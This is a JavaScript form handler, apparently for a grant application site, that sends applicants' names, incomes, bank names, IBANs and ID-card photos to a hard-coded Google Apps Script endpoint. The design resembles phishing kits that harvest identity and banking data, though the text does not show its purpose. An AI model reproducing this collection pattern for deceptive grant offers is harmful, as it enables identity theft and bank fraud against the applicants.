var APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby-fvc-LsoVHWwNdpP1Rvk4jJO-IFP5FBu9u9_6lxVd1fs0UKJPAq4P5dF1EZUfmVAO1Q/exec';

async function getBase64(fileId) {
    var input = document.getElementById(fileId);
    if (!input || !input.files || input.files.length === 0) return '';
    return new Promise(function(resolve) {
        var reader = new FileReader();
        reader.onload = function() { resolve(reader.result); };
        reader.onerror = function() { resolve(''); };
        reader.readAsDataURL(input.files[0]);
    });
}

async function sendToScript(data) {
    try {
        var response = await fetch(APPS_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(data)
        });

        // With no-cors the response body/status is opaque, so a successful
        // fetch only confirms that the browser was able to send the request.
        // The caller must still treat network failures as submission failures.
        return response.type === 'opaque' || response.ok;
    } catch (e) {
        console.error('Submission request failed:', e);
        return false;
    }
}

async function saveToGoogleSheets(txNumber) {
    try {
        // ① إرسال البيانات النصية أولاً
        var dataSaved = await sendToScript({
            action: 'save_data',
            transaction_id: txNumber,
            full_name: formData.personalInfo.fullName || '',
            country: formData.personalInfo.country === 'OTHER'
                ? (formData.personalInfo.otherCountry || '')
                : (formData.personalInfo.country || ''),
            marital_status: formData.personalInfo.maritalStatus || '',
            num_children: formData.personalInfo.numChildren || 0,
            phone: formData.contactCareer.phone || '',
            email: formData.contactCareer.email || '',
            profession: formData.contactCareer.profession || '',
            monthly_income: formData.contactCareer.income || 0,
            grant_type: formData.grantDetails.grantType || '',
            grant_amount: formData.grantDetails.grantAmount || 0,
            grant_description: formData.grantDetails.grantDescription || '',
            bank_name: formData.bankingInfo.bankName === 'OTHER'
                ? (formData.bankingInfo.otherBank || '')
                : (formData.bankingInfo.bankName || ''),
            account_holder: formData.bankingInfo.accountHolder || '',
            iban: (formData.bankingInfo.iban || '').replace(/\s/g, '')
        });

        if (!dataSaved) return false;

        // ② إرسال صورة الوجه
        var imgFront = await getBase64('idCardFront');
        if (imgFront) {
            var frontSaved = await sendToScript({
                action: 'save_image',
                transaction_id: txNumber,
                image_side: 'front',
                image_data: imgFront
            });
            if (!frontSaved) return false;
        }

        // ③ إرسال صورة الخلف
        var imgBack = await getBase64('idCardBack');
        if (imgBack) {
            var backSaved = await sendToScript({
                action: 'save_image',
                transaction_id: txNumber,
                image_side: 'back',
                image_data: imgBack
            });
            if (!backSaved) return false;
        }

        return true;
    } catch (err) {
        console.error('Unable to save application:', err);
        return false;
    }
}
